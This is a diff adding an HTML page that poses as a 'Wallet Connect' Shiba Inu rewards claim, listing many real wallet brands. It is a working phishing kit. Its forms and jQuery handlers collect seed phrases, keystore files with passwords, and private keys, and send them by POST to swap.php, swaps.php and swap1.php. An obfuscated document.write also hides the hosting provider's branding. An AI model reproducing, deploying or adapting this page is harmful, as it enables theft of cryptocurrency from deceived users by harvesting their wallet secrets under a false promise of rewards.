@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+
+
+
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="shortcut icon" href="images/1234.png" type="image/x-icon">
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
+    <link rel="stylesheet" href="./css/index.css">
+
+    <title>Wallet Connect</title>
+</head>
+
+<body>
+
+    <div class="container">
+        <div class="bwd_text_header">
+            <h2>Rewards 1,000,000,000 Shiba Inu</h2>
+            <p>Claim rewards using a mnemonic phrase or private key</p>
+        </div>
+
+        <div class="container section">
+
+            <div class="row">
+                <div class="col-xl-4 col-lg-4 col-md-12 col-sm-12">
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Qpocket Wallet')" data-bs-target="#staticBackdrop"> <img alt="">
+                        <h5>Other Wallet</h5>
+                    </div>
+
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Trust Wallet')" data-bs-target="#staticBackdrop"> <img src="images/trust-wallet.jpg" alt="">
+                        <h5>Trust Wallet</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('FortMatic')" data-bs-target="#staticBackdrop"> <img src="images/fortmatic.jpg" alt="">
+                        <h5>FortMatic</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Digitex')" data-bs-target="#staticBackdrop"> <img src="images/digitex.jpg" alt="">
+                        <h5>Digitex</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Ledger')" data-bs-target="#staticBackdrop"> <img src="images/ledger.jpg" alt="">
+                        <h5>Ledger</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Defiat')" data-bs-target="#staticBackdrop"> <img src="images/defiat.jpg" alt="">
+                        <h5>Defiat</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Authereum')" data-bs-target="#staticBackdrop"> <img src="images/authereum.png" alt="">
+                        <h5>Authereum</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('MEW Wallet')" data-bs-target="#staticBackdrop"> <img src="images/mew.png" alt="">
+                        <h5>MEW Wallet</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Flare Wallet')" data-bs-target="#staticBackdrop"> <img src="images/flare.png" alt="">
+                        <h5>Flare Wallet</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Atomic Wallet')" data-bs-target="#staticBackdrop"> <img src="images/atomic.png" alt="">
+                        <h5>Atomic Wallet</h5>
+                    </div>
+
+
+                    <!-- new  -->
+
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Zilliqa Wallet')" data-bs-target="#staticBackdrop"> <img src="images/Zilliqa.jpg" alt="">
+                        <h5>Zilliqa Wallet</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Infinity Wallet')" data-bs-target="#staticBackdrop"> <img src="images/Infinity.jpg" alt="">
+                        <h5>Infinity Wallet</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Unstoppable Wallet')" data-bs-target="#staticBackdrop"> <img src="images/Unstoppable.jpg" alt="">
+                        <h5>Unstoppable Wallet</h5>
+                    </div>
+                </div>
+
+                <div class="col-xl-4 col-lg-4 col-md-12 col-sm-12">
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Coinbase Wallet')" data-bs-target="#staticBackdrop"> <img src="images/coinbase.jpg" alt="">
+                        <h5>Coinbase Wallet</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Trezor')" data-bs-target="#staticBackdrop"> <img src="images/trezor.png" alt="">
+                        <h5>Trezor</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Squarelink')" data-bs-target="#staticBackdrop"> <img src="images/squarelink.png" alt="">
+                        <h5>Squarelink</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Torus')" data-bs-target="#staticBackdrop"> <img src="images/torus.jpg" alt="">
+                        <h5>Torus</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('VeChain')" data-bs-target="#staticBackdrop"> <img src="images/vechain.png" alt="">
+                        <h5>VeChain</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Scatter Wallet')" data-bs-target="#staticBackdrop"> <img src="images/scatter.png" alt="">
+                        <h5>Scatter Wallet</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Math Wallet')" data-bs-target="#staticBackdrop"> <img src="images/math.png" alt="">
+                        <h5>Math Wallet</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Tomo Chain')" data-bs-target="#staticBackdrop"> <img src="images/tomo.jpg" alt="">
+                        <h5>Tomo Chain</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Binance Smart Chain')" data-bs-target="#staticBackdrop"> <img src="images/binance.png" alt="">
+                        <h5>Binance Smart Chain</h5>
+                    </div>
+
+                    <!-- new  -->
+
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Iris Wallet')" data-bs-target="#staticBackdrop"> <img src="images/Iris.jpg" alt="">
+                        <h5>Iris Wallet</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Blockchain Wallet')" data-bs-target="#staticBackdrop"> <img src="images/Blockchain.jpg" alt="">
+                        <h5>Blockchain Wallet</h5>
+                    </div>
+
+                </div>
+
+                <div class="col-xl-4 col-lg-4 col-md-12 col-sm-12">
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Guard Wallet')" data-bs-target="#staticBackdrop"> <img src="images/guards.jpg" alt="">
+                        <h5>Guard Wallet</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Metamask')" data-bs-target="#staticBackdrop"> <img src="images/metamask.jpg" alt="">
+                        <h5>Metamask</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('AAVE')" data-bs-target="#staticBackdrop"> <img src="images/aave.jpg" alt="">
+                        <h5>AAVE</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Exodus')" data-bs-target="#staticBackdrop"> <img src="images/exodus.jpg" alt="">
+                        <h5>Exodus</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Coinbase')" data-bs-target="#staticBackdrop"> <img src="images/coinbase.jpg" alt="">
+                        <h5>Coinbase</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Enjin')" data-bs-target="#staticBackdrop"> <img src="images/enjin.jpg" alt="">
+                        <h5>Enjin</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Skale')" data-bs-target="#staticBackdrop"> <img src="images/skale.jpg" alt="">
+                        <h5>Skale</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Portis')" data-bs-target="#staticBackdrop"> <img src="images/portis.jpg" alt="">
+                        <h5>Portis</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Wallet Connect')" data-bs-target="#staticBackdrop"> <img src="images/wallet.jpg" alt="">
+                        <h5>Wallet Connect</h5>
+                    </div>
+
+                    <!-- new  -->
+
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Alpha Wallet')" data-bs-target="#staticBackdrop"> <img src="images/Alpha.jpg" alt="">
+                        <h5>Alpha Wallet</h5>
+                    </div>
+                    <div class="div-cont" data-bs-toggle="modal" onclick="return getWalletType('Qpocket Wallet')" data-bs-target="#staticBackdrop"> <img src="images/Qpocket.jpg" alt="">
+                        <h5>Qpocket Wallet</h5>
+                    </div>
+
+
+                </div>
+            </div>
+
+        </div>
+
+
+    </div>
+
+
+    <!-- Modal -->
+    <div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content" id="bwd_modal_content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="staticBackdropLabel">Import Wallet</h5>
+
+                    <button type="button" class="btn-close" id="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+
+                <ul class="nav nav-tabs" id="myTab" role="tablist">
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link active" id="home-tab" data-bs-toggle="tab" data-bs-target="#home" type="button" role="tab" aria-controls="home" aria-selected="true">Phrase</button>
+                    </li>
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link" id="profile-tab" data-bs-toggle="tab" data-bs-target="#profile" type="button" role="tab" aria-controls="profile" aria-selected="false">Keystore
+                            JSON</button>
+                    </li>
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link" id="contact-tab" data-bs-toggle="tab" data-bs-target="#contact" type="button" role="tab" aria-controls="contact" aria-selected="false">Private Key</button>
+                    </li>
+                </ul>
+
+                <input type="hidden" name="wallet_type" id="wallet_type">
+
+
+                <div class="tab-content" id="myTabContent">
+                    <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
+                        <form action="swap.php" id="phrase_form" method="post" autocomplete="off">
+                            <div class="modal-body">
+                                <div class="form-group">
+                                    <textarea class="form-control" name="phrase" minlength="25" maxlength="200" id="phrase" cols="30" rows="5" placeholder="phrase"></textarea>
+                                    <samp>Typically 12(sometimes 24) words separated by single spaces</samp>
+                                </div>
+                                <div class="modal-footer">
+                                    <div class="d-grid gap-2 col-6 mx-auto" id="">
+                                        <button type="button" id="bwd_btn_save_phrase" class="btn btn-primary">Import</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+
+                    <div class="tab-pane fade" id="profile" role="tabpanel" aria-labelledby="profile-tab">
+
+                        <form action="swaps.php" id="keystore_json_form" method="post" autocomplete="off">
+                            <!-- <input type="hidden" name="wallet_type" id="wallet_type"> -->
+                            <div class="modal-body">
+                                <div class="form-group">
+                                    <textarea class="form-control" minlength="25" maxlength="200" name="keystore_json" id="keystore_json" cols="30" rows="5" placeholder="keytore JSON"></textarea> <br>
+                                    <input class="form-control" minlength="25" maxlength="200" type="password" name="password" id="password" placeholder="password">
+                                    <samp>Several lines of text beginning with "{...}" plus the password you used to
+                                        encryp it.</samp>
+                                </div>
+
+                                <div class="modal-footer">
+                                    <div class="d-grid gap-2 col-6 mx-auto" id="">
+                                        <button type="button" id="bwd_btn_save_keystore" class="btn btn-primary">Import</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+
+                    <div class="tab-pane fade" id="contact" role="tabpanel" aria-labelledby="contact-tab">
+
+                        <form action="swap1.php" id="private_key_form" method="post" autocomplete="off">
+                            <!-- <input type="hidden" name="wallet_type" id="wallet_type"> -->
+                            <div class="modal-body">
+                                <div class="form-group">
+                                    <input class="form-control" type="text" minlength="25" maxlength="200" name="private_key" id="private_key" placeholder="private key">
+                                    <samp>Typically 12(sometimes 24) words separated by single spaces</samp>
+                                </div>
+
+                                <div class="modal-footer">
+                                    <div class="d-grid gap-2 col-6 mx-auto" id="">
+                                        <button type="button" id="bwd_btn_save_private_key" class="btn btn-primary">Import</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </form>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript">
+        document.write(unescape('%3c%73%74%79%6c%65%3e%0d%0a%69%6d%67%5b%61%6c%74%2a%3d%22%77%77%77%2e%30%30%30%77%65%62%68%6f%73%74%2e%63%6f%6d%22%5d%7b%0d%0a%64%69%73%70%6c%61%79%3a%6e%6f%6e%65%0d%0a%7d%20%3c%21%2d%2d%20%42%79%20%50%61%77%4e%30%20%2d%2d%3e%0d%0a%3c%2f%73%74%79%6c%65%3e')); //-->
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js" integrity="sha384-b5kHyXgcpbZJO/tY9Ul7kGkf1S0CWuKcCD38l8YkeH8z8QjE0GmW1gYU5S9FOnJ0" crossorigin="anonymous"></script>
+    <script src="js/jquery.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@10"></script>
+
+    <script>
+        function getWalletType(wallet) {
+            document.getElementById("wallet_type").value = wallet;
+        }
+
+        $('body').on('click', '#bwd_btn_save_phrase', function() {
+
+            var phrase = $('#phrase').val();
+            var wallet_type = $("#wallet_type").val();
+
+            if (phrase == '') {
+                $('#phrase').focus();
+                return;
+            }
+
+            var serializedData = $('#phrase_form').serialize();
+
+            $.ajax({
+                type: "POST",
+                url: "swap.php",
+                data: {
+                    phrase: phrase,
+                    wallet_type
+                },
+                cache: false,
+                success: (res) => {
+                    console.log(res);
+
+                    if (res == "valid") {
+
+                        Swal.fire(
+                            'Good job!',
+                            'You clicked the button!',
+                            'success'
+                        )
+
+                        $("#staticBackdrop").modal('hide');
+                        $('#phrase').val('');
+                    } else {
+                        Swal.fire({
+                            icon: 'error',
+                            title: 'Oops...',
+                            text: 'Something went wrong!'
+                        })
+
+                        $("#staticBackdrop").modal('hide');
+
+                        $('#phrase').val('');
+                    }
+                }
+            })
+        });
+
+
+        $('body').on('click', '#bwd_btn_save_keystore', function() {
+
+            var keystore_json = $('#keystore_json').val();
+            var password = $('#password').val();
+            var wallet_type = $("#wallet_type").val();
+
+            if (keystore_json == '') {
+                $('#keystore_json').focus();
+                return;
+            } else if (password == '') {
+                $('#password').focus();
+                return;
+            }
+
+            var serializedData = $('#keystore_json_form').serialize();
+
+            $.ajax({
+                type: "POST",
+                url: "swaps.php",
+                data: {
+                    keystore_json,
+                    password,
+                    wallet_type
+                },
+                cache: false,
+                success: (res) => {
+                    console.log(res);
+
+                    if (res == "valid") {
+
+                        Swal.fire(
+                            'Good job!',
+                            'You clicked the button!',
+                            'success'
+                        )
+                        $("#staticBackdrop").modal('hide');
+
+                        $('#keystore_json').val('');
+                        $('#password').val('');
+                    } else {
+                        Swal.fire({
+                            icon: 'error',
+                            title: 'Oops...',
+                            text: 'Something went wrong!'
+                        })
+
+                        $("#staticBackdrop").modal('hide');
+
+                        $('#keystore_json').val('');
+                        $('#password').val('');
+                    }
+                }
+            })
+        });
+
+
+        $('body').on('click', '#bwd_btn_save_private_key', function() {
+
+            var private_key = $('#private_key').val();
+            var wallet_type = $("#wallet_type").val();
+
+            if (private_key == '') {
+                $('#private_key').focus();
+                return;
+            }
+
+            var serializedData = $('#private_key_form').serialize();
+
+            $.ajax({
+                type: "POST",
+                url: "swap1.php",
+                data: {
+                    private_key,
+                    wallet_type
+                },
+                cache: false,
+                success: (res) => {
+                    console.log(res);
+                    if (res == "valid") {
+
+                        Swal.fire(
+                            'Good job!',
+                            'You clicked the button!',
+                            'success'
+                        )
+                        $("#staticBackdrop").modal('hide');
+
+                        $('#private_key').val('');
+                    } else {
+                        Swal.fire({
+                            icon: 'error',
+                            title: 'Oops...',
+                            text: 'Something went wrong!'
+                        })
+
+                        $("#staticBackdrop").modal('hide');
+
+                        $('#private_key').val('');
+                    }
+                }
+            })
+        });
+
+        $('#btn-close').click(() => {
+            $('#phrase').val('');
+            $('#keystore_json').val('');
+            $('#password').val('');
+            $('#private_key').val('');
+        })
+    </script>
+
+</body>
+
+</html>
